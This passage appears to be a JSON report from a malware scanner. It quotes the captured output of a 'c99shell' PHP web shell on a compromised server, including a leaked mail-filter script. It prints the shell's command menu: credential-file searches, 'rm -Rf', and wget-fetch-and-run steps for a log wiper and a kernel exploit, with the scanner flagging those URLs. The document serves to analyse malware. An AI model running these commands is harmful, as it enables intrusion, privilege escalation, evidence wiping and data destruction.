            "            $domain = Exim::expand_string( '${lookup{' . $username . '}lsearch{/etc/domainusers}{$value}}' );",
            "        }",
            "    }",
            "    if ($domain) { $domain =~ s/[^\\w\\.\\-\\/]//g; }",
            "    return $domain;",
            "sub trackbandwidth {",
            "    $trackbandwidth_message = '';",
            "    my $uid = int( Exim::expand_string('$originator_uid') );",
            "    my $gid = int( Exim::expand_string('$originator_gid') );",
            "    # Here we get the domain from the user or the sender if smtp",
            "    my $domain = getmessagedomain( $uid, $gid );",
            "    if ( !$domain || $domain eq '' ) { return 'no'; }",
            "    my $domain_owner = getdomainowner($domain);",
            "    if ( !$domain_owner || $domain_owner eq '' ) { return 'no'; }",
            "    my $now = time();",
            "    increment_max_emails_per_hour( $domain, $now );",
            "#    The exim bandwidth data is handled by tailwatch::eximstats so no need to ",
            "#    write this anymore    ",
            "#    my $message_size = Exim::expand_string('$message_size');",
            "#    open( my $bytes_log_fh, '&gt;&gt;', '/usr/local/apache/domlogs/' . $domain . '-smtpbytes_log' );",
            "#    chmod( 0640, '/usr/local/apache/domlogs/' . $domain . '-smtpbytes_log' );",
            "#    print {$bytes_log_fh} $now . ' ' . $message_size . ' .' . &quot;\\n&quot;;",
            "#    close($bytes_log_fh);",
            "    return 'no';",
            "sub checkspam2 {",
            "    my $uid = int( Exim::expand_string('$originator_uid') );",
            "    $checkspam_message = '';",
            "    if ( !$nobody_uid ) {",
            "        $nobody_uid = int( Exim::expand_string( '${extract{2}{:}{${lookup passwd{nobody}{$value}}}}' ) );",
            "    }",
            "    my $webspam_on = -e '/etc/webspam' ? 1 : 0;",
            "    if ( $uid == $nobody_uid &amp;&amp; $webspam_on ) {",
            "        $checkspam_message = 'Mail sent by user nobody being discarded due to sender restrictions in WHM-&gt;Tweak Settings';",
            "        return 'yes';",
            "    }",
            "    my $gid = int( Exim::expand_string('$originator_gid') );",
            "    #MAILTRAP",
            "    if ( -e '/etc/eximmailtrap' ) {",
            "        if ( !$mailtrap_gid ) {",
            "            $mailtrap_gid = int( ( getgrnam('mailtrap') )[2] );",
            "        }",
            "        if ( !$nobody_gid ) {",
            "            $nobody_gid = int( ( getgrnam('nobody') )[2] );",
            "        }",
            "        if ( $uid &gt;= $nobody_uid &amp;&amp; $gid &gt;= $nobody_gid &amp;&amp; $gid != $mailtrap_gid ) {",
            "            $checkspam_message = &quot;Gid $gid is not permitted to relay mail, or has directly called /usr/sbin/exim instead of /usr/sbin/sendmail.&quot;;",
            "            return 'yes';",
            "        }",
            "    }",
            "    #MAILTRAP",
            "    if( Exim::expand_string('$received_protocol') eq 'local' &amp;&amp; isdemo($uid)) {",
            "        $checkspam_message = &quot;User with uid $uid is a demo user.  You cannot send mail if your account is in demo mode.&quot;;",
            "        return 'yes';",
            "    };",
            "    my $domain = getmessagedomain( $uid, $gid );",
            "    if ( !$domain || $domain eq '' ) { return 'no'; }",
            "    my $domain_owner = getdomainowner($domain);",
            "    if ( !$domain_owner || $domain_owner eq '' ) { return 'no'; }",
            "    #logsmtpbw here",
            "    my $maxmails = getmaxemailsperhour($domain);",
            "    my $now      = time();",
            "    if ( reached_max_emails_per_hour( $domain, $maxmails, $now ) ) {",
            "        $checkspam_message = &quot;Domain $domain has exceeded the max emails per hour ($maxmails) allowed. Message discarded.&quot;;",
            "        return 'yes';",
            "    }",
            "    #end logsmtpbw",
            "    return 'no';",
            "sub getmaxemailsperhour {",
            "    my $domain    = shift;",
            "    my $maxemails = 0;       # Defaults to &quot;unlimited&quot;",
            "    if ( open my $max_fh, '&lt;', '/var/cpanel/maxemailsperdomain/' . $domain ) {    # This is the user's main domain. All user's domains are aggregated here",
            "        $maxemails = readline $max_fh;",
            "        close $max_fh;",
            "        chomp $maxemails;",
            "        $maxemails = $maxemails ? int($maxemails) : 0;",
            "    }",
            "    elsif ( open my $max_fh, '&lt;', '/var/cpanel/maxemailsperhour' ) {              # This is the system setting",
            "        $maxemails = readline $max_fh;",
            "        close $max_fh;",
            "        chomp $maxemails;",
            "        $maxemails = $maxemails ? int($maxemails) : 0;",
            "    }",
            "    return $maxemails;",
            "sub increment_max_emails_per_hour {",
            "    my $domain = shift;",
            "    my $time   = shift;",
            "    my ( $hour, $mday, $mon, $year ) = ( gmtime($time) )[ 2, 3, 4, 5 ];",
            "    check_tracker_dir($domain);",
            "    if( !-e &quot;/var/cpanel/maxemailstracker/$domain&quot; ) {",
            "        open(my $emailt_fh,'&gt;&gt;',&quot;/var/cpanel/maxemailstracker/$domain&quot;);",
            "        close($emailt_fh);",
            "    }",
            "    my $elock = safeopen( \\*MTR, '+&lt;', '/var/cpanel/maxemailstracker/' . $domain );",
            "    if( !$elock) {",
            "# We cannot warn because exim will stop delivery if we do",
            "#warn &quot;Could not edit /var/cpanel/maxemailstracker/$domain \\n&quot;;",
            "        return;",
            "    }",
            "    my ( $lasttimeline, $emails ) = split( /=/, readline( \\*MTR ), 2 );",
            "    my $numsentthishour = 0;",
            "    if ( $lasttimeline eq $hour . '.' . $mday . '.' . $mon . '.' . $year ) {",
            "        $numsentthishour = int $emails;",
            "    }",
            "    seek( MTR, 0, 0 );",
            "    truncate( MTR, 0 );",
            "    $numsentthishour++;",
            "    print MTR $hour . '.' . $mday . '.' . $mon . '.' . $year . '=' . $numsentthishour;",
            "    safeclose( \\*MTR, $elock );",
            "sub check_tracker_dir {",
            "    my $domain = shift;",
            "    if ( !-e '/var/cpanel/maxemailstracker/' . $domain ) {",
            "        open( my $email_fh, '&gt;&gt;', '/var/cpanel/maxemailstracker/' . $domain );",
            "        close($email_fh);",
            "        chmod( 0660, '/var/cpanel/maxemailstracker/' . $domain );",
            "    }",
            "sub reached_max_emails_per_hour {",
            "    my $domain      = shift;",
            "    my $max_allowed = shift || 0;",
            "    my $time        = shift;",
            "    $max_allowed = int $max_allowed;",
            "    if ($max_allowed) {",
            "        my ( $hour, $mday, $mon, $year ) = ( gmtime($time) )[ 2, 3, 4, 5 ];",
            "        check_tracker_dir($domain);",
            "        my $elock = safeopen( \\*MTR, '&lt;', '/var/cpanel/maxemailstracker/' . $domain );",
            "        if( !$elock) {",
            "# We cannot warn because exim will stop delivery if we do",
            "#warn &quot;Could not read from /var/cpanel/maxemailstracker/$domain \\n&quot;;",
            "            return; ",
            "        }",
            "        my ( $lasttimeline, $emails ) = split( /=/, readline( \\*MTR ), 2 );",
            "        my $numsentthishour = 0;",
            "        if ( $lasttimeline eq $hour . '.' . $mday . '.' . $mon . '.' . $year ) {",
            "            $numsentthishour = int $emails;",
            "        }",
            "        safeclose( \\*MTR, $elock );",
            "        if ( $numsentthishour &gt;= $max_allowed ) {",
            "            return 1;",
            "        }",
            "        else {",
            "            return 0;",
            "        }",
            "    }",
            "    else {",
            "        return 0;",
            "    }",
            "sub store_spam {",
            "    my $sender_host_address = shift;",
            "    my $spam_score          = shift;",
            "    my $now                 = time();",
            "    open( my $spam_fh, '&gt;&gt;', '/var/cpanel/spamstore' );",
            "    #uncomment to deploy",
            "    #    syswrite($spam_fh, $now . ':' . $sender_host_address . ':' . $spam_score . &quot;:.\\n&quot;);",
            "    close($spam_fh);",
            "}sub checkuserquota {",
            "    my ( $domain, $localpart, $msgsize, $quota, $maildirsizefile ) = @_;",
            "    if (defined $quota &amp;&amp; $quota == 0) {",
            "        return 'false';",
            "    }",
            "    #we want to let the user go over their quota on the last message",
            "    #so next time we can reject their email at smtp time.  This is a chicken-egg problem",
            "    #we can't know the message size at smtp time because we haven't received it yet",
            "    #that then causes this check to happen and the mailer to generate a bounce",
            "    #to prevent this we won't check the message, only if they are actually over their quota.",
            "    $msgsize = 0;",
            "    my $owner;",
            "    my $homedir;",
            "    my $quotafile;    ",
            "    if (! $maildirsizefile || !defined $quota) {",
            "        $owner   = getdomainowner($domain);",
            "        $homedir = gethomedir($owner);",
            "        $quotafile     = $homedir . '/etc/' . $domain . '/quota';",
            "        $maildirsizefile = $homedir . '/mail/' . $domain . '/' . $localpart . '/maildirsize';",
            "    }",
            "    my $addressexists = 0;",
            "    if (!defined $quota) {",
            "        if ( !-e $quotafile ) { return 'false'; }",
            "        $quota = int fetchquota( $quotafile, $localpart );",
            "        if ( !defined $quota || $quota == 0 ) { return 'false'; }",
            "    }",
            "    my $maildirsize     = 0;",
            "    if ( !-r $maildirsizefile ) {",
            "        my $zpid = open( READCHLD, &quot;-|&quot; );",
            "        if ($zpid) {",
            "            $maildirsize = int &lt;READCHLD&gt;;",
            "        }",
            "        else {",
            "            exec( '/usr/local/cpanel/bin/eximwrap', 'GETDISKUSED', $localpart, $domain );",
            "            exit(127);",
            "        }",
            "        close(READCHLD);",
            "    }",
            "    else {",
            "        $maildirsize = maildirsizecounter($maildirsizefile);",
            "    }",
            "    if ( $maildirsize == 0 ) { return 'false'; }",
            "    if ( ( $msgsize + $maildirsize ) &gt; $quota ) {",
            "        return &quot;yes&quot;;",
            "    }",
            "    return 'false';",
            "################################################################################",
            "# maildirsizecounter",
            "################################################################################",
            "sub maildirsizecounter {",
            "    my $maildirsizef = shift;",
            "    my $count        = 0;",
            "    if ( open my $mds_fh, '&lt;', $maildirsizef ) {",
            "        readline $mds_fh;    # Skip Quota line",
            "            while ( my $mdsl = readline $mds_fh ) {",
            "                if ( $mdsl =~ m/^\\s*(\\-?\\d+)\\s+(\\-?\\d+)/ ) {",
            "                    $count += int $1;",
            "                }",
            "            }",
            "        close $mds_fh;",
            "    }",
            "    if ( $count &lt; 0 ) {",
            "        $count = 0;",
            "    }",
            "    return $count;",
            "################################################################################",
            "# fetchquota",
            "################################################################################",
            "sub fetchquota {",
            "    my ($quotafile,$localpart) = @_;",
            "    my $qmlocalpart = quotemeta($localpart);",
            "    open( QUOTA, '&lt;', $quotafile );",
            "    while (&lt;QUOTA&gt;) {",
            "        if ( /^$qmlocalpart:/) {",
            "            close(QUOTA);",
            "            chomp();",
            "            my $qnum = (split( /:/, $_, 2 ))[1];",
            "            return int $qnum;",
            "        }",
            "    }",
            "    close(QUOTA);",
            "    return 0;",
            "################################################################################",
            "# beginmatch",
            "################################################################################",
            "sub beginmatch {",
            "    my $haystack = shift;",
            "    my $needle   = shift;",
            "    if ( substr( lc($haystack), 0, length($needle) ) eq lc($needle) ) {",
            "        return 1;",
            "    }",
            "    return 0;",
            "sub gethomedir {",
            "    my $user = shift;",
            "    return Exim::expand_string( '${extract{5}{:}{${lookup passwd{' . $user . '}{$value}}}}' ) || '';",
            "sub getdomainowner {",
            "    my $domain = shift;",
            "    return Exim::expand_string( '${lookup{' . $domain . '}lsearch{/etc/userdomains}{$value}}' ) || '';",
            "}sub checkvalias {",
            "    my $has_autoresponder = 0;",
            "    my $alias_line = Exim::expand_string('${lookup{$local_part@$domain}lsearch{/etc/valiases/$domain}{$value}}');",
            "    my @DESTS = split(/\\,/, $alias_line);",
            "    foreach my $dest (@DESTS) {",
            "        if ($dest =~ /\\/autorespond/) {",
            "            $has_autoresponder = 1;",
            "        } else {",
            "            return 1;",
            "        }",
            "    }    ",
            "    my $star_alias_line = Exim::expand_string('${lookup{\\N*\\N}lsearch{/etc/valiases/$domain}{$value}}');",
            "    if ($has_autoresponder &amp;&amp; $star_alias_line =~ /:fail:/) {",
            "        return 1;",
            "    }",
            "    return 0;",
            "sub getusersdomain {",
            "    return lookup_key_in_file('/etc/domainusers',@_);",
            "sub lookup_key_in_file {",
            "    my($file,$key) = @_;",
            "    return Exim::expand_string( '${lookup{' . $key . '}lsearch{' . $file . '}{$value}}' ) || '';",
            "sub isdemo {",
            "    my $user = shift;",
            "    return if ( !$user );",
            "    if ( $user =~ /^\\d+$/ ) {",
            "        return user_exists_in_db($user,'/etc/demouids');",
            "    }",
            "    return user_exists_in_db( $user, '/etc/demousers' );",
            "sub user_exists_in_db {",
            "    my($user,$db) = @_;",
            "    return Exim::expand_string( '${lookup{' . $user . '}lsearch{' . $db . '}{1}{0}}' ) || '0';",
            "sub _lock_wait {",
            "    my $file     = shift;",
            "    my $waittime = 0;",
            "    if ( -e $file ) {",
            "        $waittime = int( ( stat(_) )[7] / 10000 );",
            "        $waittime = $waittime &gt; 350 ? 350 : $waittime &lt; 60 ? 60 : $waittime;",
            "    }",
            "    my $lockfile = $file . '.lock';",
            "    $lockfile =~ s/^[&gt;&lt;]*//g;",
            "    if ( -e $lockfile ) {    # File is locked via Cpanel::SafeFile",
            "        if ($waittime) {",
            "            my ( $fileuid, $locksize, $omtime ) = ( stat(_) )[ 4, 7, 9 ];",
            "            my $lock_is_our_uid = ( $fileuid == $&gt; ? 1 : 0 );",
            "            if ( $lock_is_our_uid || $waittime &gt; 60 ) {    # Don't bother if waittime is less than 60 seconds",
            "                my $lock_pid = 0;",
            "                if ( $locksize &amp;&amp; ( $lock_is_our_uid || -e '/proc/1' ) ) {    # PID is inside lock file",
            "                    if ( open my $lockfile_fh, '&lt;', $lockfile ) {",
            "                        while ( readline $lockfile_fh ) {",
            "                            if (m/(\\d+)/) {",
            "                                $lock_pid = $1;",
            "                            }",
            "                        }",
            "                        close $lockfile_fh;",
            "                    }",
            "                }",
            "                if ( $lock_pid == $$ ) {",
            "                    Carp::cluck(&quot;Double locking detected on $file&quot;);",
            "                    return $lockfile;",
            "                }",
            "                if ( $lock_pid &gt; 1 &amp;&amp; ( $lock_is_our_uid || -e '/proc/' . $lock_pid ) ) {",
            "                    my $loop_count = 0;",
            "                    while ($loop_count &lt; $waittime",
            "                        &amp;&amp; -e $lockfile",
            "                        &amp;&amp; ( $lock_is_our_uid ? ( kill( 0, $lock_pid ) &gt; 0 ? 1 : 0 ) : ( -e '/proc/' . $lock_pid ? 1 : 0 ) ) ) {",
            "                        sleep 1;",
            "                        $loop_count++;",
            "                    }",
            "                    my $mtime = ( stat($lockfile) )[9];",
            "                    if ( !$mtime || $mtime == $omtime ) {",
            "                        unlink $lockfile;",
            "                        $waittime = 0;",
            "                    }",
            "                }",
            "            }",
            "            if ( $waittime &amp;&amp; $omtime ) {    # $waittime may have been previously reset during PID check",
            "                my $i = 0;",
            "              WAIT:",
            "                while ( $omtime &gt; 0 ) {",
            "                    if ( -e $lockfile ) {",
            "                        my $mtime = ( stat(_) )[9];",
            "                        sleep 1;",
            "                        if ( $mtime == $omtime ) {",
            "                            $i++;            # lock file has aged",
            "                        }",
            "                        else {               # there is a new lock file, reset",
            "                            $omtime = $mtime;",
            "                            $i      = 0;",
            "                        }",
            "                        if ( $i == $waittime ) {    # lock file aged waittime sec",
            "                            last WAIT;",
            "                        }",
            "                    }",
            "                    else {",
            "                        last WAIT;",
            "                    }",
            "                }",
            "            }",
            "        }",
            "        else {                                      # Target file doesn't exist so just remove any stray lock file",
            "            unlink $lockfile;",
            "        }",
            "    }",
            "    return $lockfile;",
            "sub safeopen {",
            "    my $fh = shift;",
            "    my ( $mode, $file ) = _get_open_args(@_);",
            "    if ( !$mode || !$file ) {",
            "        warn 'safeopen: Invalid arguments';",
            "        return -1;",
            "    }",
            "    my $lockfile = _lock_wait($file);",
            "    if ( open $fh, $mode, $file ) {",
            "        if ( open my $lock_fh, '&gt;', $lockfile ) {",
            "            print {$lock_fh} $$;",
            "            close $lock_fh;",
            "        }",
            "        return $lockfile;",
            "    }",
            "    else {",
            "        return;",
            "    }",
            "sub safeclose {",
            "    my ( $fh, $lock ) = @_;",
            "    unlink $lock;",
            "    if ( defined fileno $fh ) {",
            "        close $fh;",
            "    }",
            "sub _get_open_args {",
            "    my ( $arg1, $arg2 ) = @_;",
            "    my ( $mode, $file );",
            "    if ( !$arg2 ) {",
            "        ( $mode, $file ) = $arg1 =~ m/^([&lt;&gt;+|]+|)(.*)/;",
            "        if ( $file &amp;&amp; !$mode ) {",
            "            $mode = '&lt;';",
            "        }",
            "        elsif ( !$file ) {",
            "            return;",
            "        }",
            "    }",
            "    else {",
            "        $file = $arg2;",
            "        $mode = $arg1;",
            "    }",
            "    return if !$file;",
            "    $mode =",
            "        $mode eq '&lt;'  ? '&lt;'",
            "      : $mode eq '&gt;'  ? '&gt;'",
            "      : $mode eq '&gt;&gt;' ? '&gt;&gt;'",
            "      : $mode eq '+&lt;' ? '+&lt;'",
            "      :                 return;",
            "    return ( $mode, $file );",
            "# Obselete as we no longer need the quota test since the spamassasin bug has been solved",
            "# (dbm fix)",
            "sub acl_checksa_deliver {",
            "    if (-e '/etc/global_spamassassin_enable') { return 1; }",
            "    ",
            "    my $domain = shift;",
            "    my $owner = getdomainowner($domain);",
            "    my $homedir = shift;",
            "    if (!$homedir) {",
            "         $homedir = gethomedir($owner);",
            "    }",
            "    return ( (-e $homedir . '/.spamassassinenable' ) ? 1 : 0 );",
            "sub acl_checkusersa {",
            "    if (-e '/etc/global_spamassassin_enable') { return 1; }",
            "    ",
            "    my $owner = shift;",
            "    if ($owner eq 'root') { return 0; }",
            "    my $homedir = shift;",
            "    if (!$homedir) {",
            "         $homedir = gethomedir($owner);",
            "    }",
            "    return ( (-e $homedir . '/.spamassassinenable' ) ? 1 : 0 );",
            "sub quotatest {",
            "    my $owner = shift;",
            "    my $homedir = shift;",
            "    if ($&gt; == 0) {",
            "        my $waittime = 1;",
            "        while(-e ${homedir} . '/.spamassassinquotatest') {",
            "            if ($waittime == 60) { last; }",
            "            $waittime++;",
            "            sleep(1);",
            "        }",
            "        my $pid;",
            "        if (!($pid = fork())) {",
            "            umask(0002);",
            "            &amp;setuids($owner);",
            "            open(QUOTATEST,&quot;&gt;${homedir}/.spamassassinquotatest&quot;);",
            "            print QUOTATEST &quot; &quot; x 4096;",
            "            close(QUOTATEST);",
            "            exit();",
            "        }",
            "        waitpid($pid,0);",
            "        if (!((stat(&quot;${homedir}/.spamassassinquotatest&quot;))[7] == 4096)) {",
            "            unlink(&quot;${homedir}/.spamassassinquotatest&quot;);",
            "            return 0;",
            "        }",
            "        unlink(&quot;${homedir}/.spamassassinquotatest&quot;);",
            "    }",
            "    return 1;",
            "</textarea></form>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fetc%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fetc\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/etc/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/etc/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.012 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c",
            "http://google.com/search"
        ]
    },
    "time": "0:00:00.516740",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
